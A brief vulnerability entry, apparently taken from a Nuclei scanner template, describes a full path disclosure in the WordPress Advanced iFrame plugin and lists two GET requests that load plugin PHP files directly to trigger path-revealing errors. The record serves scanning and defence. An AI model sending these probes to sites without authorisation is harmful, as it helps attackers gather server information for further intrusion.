# Vulnerability: WordPress Advanced iFrame - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-advanced-iframe-fpd.yaml`)

## Description
WordPress Advanced iFrame plugin files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/advanced-iframe/advanced-iframe.php
GET {{BaseURL}}/wp-content/plugins/advanced-iframe/advanced-iframe-admin-page.php
```

